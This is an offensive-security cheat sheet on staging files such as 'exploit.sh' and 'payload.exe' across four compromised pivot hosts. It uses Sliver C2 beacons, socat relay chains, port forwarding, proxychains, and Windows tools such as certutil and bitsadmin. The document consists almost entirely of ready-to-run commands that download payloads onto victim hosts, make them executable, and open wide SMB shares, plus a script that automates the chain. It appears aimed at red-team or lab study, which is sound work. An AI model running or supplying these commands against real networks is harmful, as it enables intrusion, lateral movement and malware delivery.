---
icon: paper-plane
---

# File Transfer

### Method 1: File Transfer Using Sliver Beacons (Easiest)

#### **Scenario: 4-Level Pivoting File Transfer**

```
Kali → Host1 → Host2 → Host3 → Host4 (Final Target)
```

***

#### **Transfer Files Through 4 Pivots (Linux & Windows)**

**Step 1: Upload File from Kali to Host1**

```bash
# Using BEACON_1
sliver > use <beacon1_id>
sliver (BEACON_1) > upload /root/tools/exploit.sh /tmp/exploit.sh

# For Windows
sliver (BEACON_1) > upload C:\tools\payload.exe C:\Windows\Temp\payload.exe

# Verify upload
sliver (BEACON_1) > ls /tmp
sliver (BEACON_1) > ls C:\Windows\Temp
```

***

**Step 2: Transfer from Host1 to Host2**

**Option A: Using Sliver Upload (Requires beacon2 already running)**

```bash
# Switch to BEACON_1
sliver > use <beacon1_id>

# Start HTTP server on Host1
sliver (BEACON_1) > shell
cd /tmp
python3 -m http.server 8080 &
exit

# Switch to BEACON_2 and download
sliver > use <beacon2_id>
sliver (BEACON_2) > shell
wget http://10.10.10.5:8080/exploit.sh -O /tmp/exploit.sh
chmod +x /tmp/exploit.sh
exit
```

**Option B: Using SCP (If you have credentials)**

```bash
# From BEACON_1 shell
sliver (BEACON_1) > shell
scp /tmp/exploit.sh user@10.10.10.20:/tmp/
exit
```

**Option C: Using Netcat (File Transfer)**

```bash
# On Host2 (Receiver) - via BEACON_2
sliver (BEACON_2) > shell
nc -lvnp 4444 > /tmp/exploit.sh
exit

# On Host1 (Sender) - via BEACON_1
sliver (BEACON_1) > shell
nc 10.10.10.20 4444 < /tmp/exploit.sh
exit
```

**For Windows:**

```powershell
# On Host2 (Windows) - Receiver
sliver (BEACON_2) > shell
certutil -urlcache -f http://10.10.10.5:8080/payload.exe C:\Windows\Temp\payload.exe
# Or PowerShell
Invoke-WebRequest -Uri http://10.10.10.5:8080/payload.exe -OutFile C:\Windows\Temp\payload.exe
exit
```

***

**Step 3: Transfer from Host2 to Host3**

```bash
# Start HTTP server on Host2
sliver (BEACON_2) > shell
cd /tmp
python3 -m http.server 8080 &
exit

# Download from Host3
sliver (BEACON_3) > shell
wget http://10.10.10.20:8080/exploit.sh -O /tmp/exploit.sh
chmod +x /tmp/exploit.sh
exit
```

**Windows to Windows:**

```powershell
# On Host2 - Start SMB share or HTTP server
sliver (BEACON_2) > shell
# Option 1: PowerShell HTTP server
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:8080/')
$listener.Start()

# Option 2: Python HTTP server (if available)
python -m http.server 8080
exit

# On Host3 - Download
sliver (BEACON_3) > shell
Invoke-WebRequest -Uri http://10.10.10.20:8080/payload.exe -OutFile C:\Temp\payload.exe
exit
```

***

**Step 4: Transfer from Host3 to Host4 (Final Target)**

```bash
# Start HTTP server on Host3
sliver (BEACON_3) > shell
cd /tmp
python3 -m http.server 8080 &
exit

# Download on Host4
sliver (BEACON_4) > shell
wget http://10.10.10.30:8080/exploit.sh -O /tmp/exploit.sh
chmod +x /tmp/exploit.sh
exit
```

***

### Method 2: Using Socat for File Transfer

**Socat is powerful for direct file transfers through pivots.**

#### **Setup: 4-Level File Transfer with Socat**

***

**Level 1: Kali to Host1**

```bash
# On Host1 (Receiver)
socat TCP-LISTEN:5555,reuseaddr,fork OPEN:/tmp/received_file.txt,creat,trunc

# On Kali (Sender)
socat FILE:/root/myfile.txt TCP:10.10.10.5:5555
```

***

**Level 2: Host1 to Host2 (Through Pivot)**

**Setup on Host1 (Relay):**

```bash
# On Host1 - Create relay
socat TCP-LISTEN:5556,reuseaddr,fork TCP:10.10.10.20:5555
```

**On Host2 (Receiver):**

```bash
socat TCP-LISTEN:5555,reuseaddr,fork OPEN:/tmp/received_file.txt,creat,trunc
```

**On Kali (Sender through relay):**

```bash
socat FILE:/root/myfile.txt TCP:10.10.10.5:5556
```

***

**Level 3: Host1 → Host2 → Host3**

**On Host1 (First Relay):**

```bash
socat TCP-LISTEN:5557,reuseaddr,fork TCP:10.10.10.20:5556
```

**On Host2 (Second Relay):**

```bash
socat TCP-LISTEN:5556,reuseaddr,fork TCP:10.10.10.30:5555
```

**On Host3 (Receiver):**

```bash
socat TCP-LISTEN:5555,reuseaddr,fork OPEN:/tmp/received_file.txt,creat,trunc
```

**On Kali (Sender):**

```bash
socat FILE:/root/myfile.txt TCP:10.10.10.5:5557
```

***

**Level 4: Full Chain (Host1 → Host2 → Host3 → Host4)**

**On Host1 (First Relay):**

```bash
socat TCP-LISTEN:5558,reuseaddr,fork TCP:10.10.10.20:5557
```

**On Host2 (Second Relay):**

```bash
socat TCP-LISTEN:5557,reuseaddr,fork TCP:10.10.10.30:5556
```

**On Host3 (Third Relay):**

```bash
socat TCP-LISTEN:5556,reuseaddr,fork TCP:10.10.10.40:5555
```

**On Host4 (Final Receiver):**

```bash
socat TCP-LISTEN:5555,reuseaddr,fork OPEN:/tmp/final_file.txt,creat,trunc
```

**On Kali (Sender through entire chain):**

```bash
socat FILE:/root/myfile.txt TCP:10.10.10.5:5558
```

***

### Method 3: Using Sliver's Built-in Port Forwarding

#### **Setup File Transfer Using Port Forwarding**

```bash
# On Kali - Setup HTTP server
python3 -m http.server 8000

# Forward Kali's port 8000 through all pivots to Host4
sliver (BEACON_1) > portfwd add -r 127.0.0.1:8000 -l 8001
sliver (BEACON_2) > portfwd add -r 10.10.10.5:8001 -l 8002
sliver (BEACON_3) > portfwd add -r 10.10.10.20:8002 -l 8003
sliver (BEACON_4) > shell
wget http://10.10.10.30:8003/myfile.txt
```

***

### Method 4: Base64 Encoding (For Small Files)

**Best for small files through shell access.**

#### **Transfer Through 4 Pivots**

```bash
# On Kali - Encode file
base64 /root/myfile.txt > myfile.b64

# Copy base64 content
cat myfile.b64

# On Host1 - Paste and decode
sliver (BEACON_1) > shell
echo "BASE64_CONTENT_HERE" | base64 -d > /tmp/myfile.txt
exit

# Repeat for Host2
sliver (BEACON_2) > shell
echo "BASE64_CONTENT_HERE" | base64 -d > /tmp/myfile.txt
exit

# Continue for Host3 and Host4
```

**For Windows:**

```powershell
# Encode on Kali
base64 payload.exe > payload.b64

# On Windows host
sliver (BEACON_1) > shell
certutil -decode C:\Temp\payload.b64 C:\Temp\payload.exe
exit
```

***

### Method 5: SOCKS Proxy + Direct Transfer

**Most flexible method!**

#### **Setup SOCKS Through All Pivots**

```bash
# On BEACON_1
sliver (BEACON_1) > socks5 start
# Output: Started SOCKS5 on 127.0.0.1:1081

# Configure proxychains
nano /etc/proxychains4.conf
# Add: socks5 127.0.0.1 1081

# Now directly transfer files
proxychains scp /root/myfile.txt user@10.10.10.40:/tmp/
proxychains rsync -avz /root/files/ user@10.10.10.40:/tmp/files/
```

***

### Complete File Transfer Example (4 Pivots)

#### **Scenario: Transfer `exploit.sh` from Kali to Host4**

```bash
# ===== STEP 1: Upload to Host1 =====
sliver > use <beacon1_id>
sliver (BEACON_1) > upload /root/exploit.sh /tmp/exploit.sh
sliver (BEACON_1) > shell
cd /tmp
python3 -m http.server 8080 &
exit

# ===== STEP 2: Download on Host2 =====
sliver > use <beacon2_id>
sliver (BEACON_2) > shell
wget http://10.10.10.5:8080/exploit.sh -O /tmp/exploit.sh
chmod +x /tmp/exploit.sh
python3 -m http.server 8080 &
exit

# ===== STEP 3: Download on Host3 =====
sliver > use <beacon3_id>
sliver (BEACON_3) > shell
wget http://10.10.10.20:8080/exploit.sh -O /tmp/exploit.sh
chmod +x /tmp/exploit.sh
python3 -m http.server 8080 &
exit

# ===== STEP 4: Download on Host4 (Final) =====
sliver > use <beacon4_id>
sliver (BEACON_4) > shell
wget http://10.10.10.30:8080/exploit.sh -O /tmp/exploit.sh
chmod +x /tmp/exploit.sh
ls -la /tmp/exploit.sh
exit
```

***

### Windows File Transfer Methods

#### **Method 1: PowerShell Download**

```powershell
Invoke-WebRequest -Uri http://10.10.10.5:8080/payload.exe -OutFile C:\Temp\payload.exe

# Or shorter
iwr http://10.10.10.5:8080/payload.exe -o C:\Temp\payload.exe
```

#### **Method 2: Certutil**

```cmd
certutil -urlcache -f http://10.10.10.5:8080/payload.exe C:\Temp\payload.exe
```

#### **Method 3: BITSAdmin**

```cmd
bitsadmin /transfer myDownload /download /priority high http://10.10.10.5:8080/payload.exe C:\Temp\payload.exe
```

#### **Method 4: SMB Transfer (Between Windows Hosts)**

```powershell
# On sending host
net share transfer=C:\Temp /grant:everyone,FULL

# On receiving host
copy \\10.10.10.5\transfer\payload.exe C:\Temp\
```

***

### Automated Script for 4-Level Transfer

```bash
#!/bin/bash
# file_transfer_chain.sh

FILE=$1
HOSTS=("10.10.10.5" "10.10.10.20" "10.10.10.30" "10.10.10.40")

echo "[+] Starting 4-level file transfer"

# Upload to Host1
sliver -c "use beacon1; upload $FILE /tmp/$(basename $FILE)"

# Setup HTTP servers on each hop
for i in {1..3}; do
    sliver -c "use beacon$i; shell; python3 -m http.server 8080 &"
done

# Download chain
for i in {2..4}; do
    prev_host=${HOSTS[$((i-2))]}
    sliver -c "use beacon$i; shell; wget http://$prev_host:8080/$(basename $FILE) -O /tmp/$(basename $FILE)"
done

echo "[+] File transferred to all 4 levels!"
```

***

### Some bloody Tips&#x20;

#### **1. Verify File Integrity**

```bash
# On Kali - Generate hash
md5sum exploit.sh
# Output: a1b2c3d4... exploit.sh

# On final target - Verify
sliver (BEACON_4) > shell
md5sum /tmp/exploit.sh
exit
```

#### **2. Compress Before Transfer**

```bash
# Compress on Kali
tar czf exploit.tar.gz exploit.sh scripts/ tools/

# Transfer compressed file (faster)
# Decompress on target
tar xzf exploit.tar.gz
```

#### **3. Split Large Files**

```bash
# On Kali
split -b 10M large_file.iso part_

# Transfer parts individually
# Combine on target
cat part_* > large_file.iso
```

#### **4. Background HTTP Servers**

```bash
# Persistent HTTP server
sliver (BEACON_1) > shell
nohup python3 -m http.server 8080 > /dev/null 2>&1 &
exit
```

***

**Summary:** For 4-level pivoting, the **HTTP server chain method** is most reliable. Each pivot runs an HTTP server, and the next level downloads from it. Socat is powerful but requires more setup. Sliver's built-in upload is easiest for initial transfers!
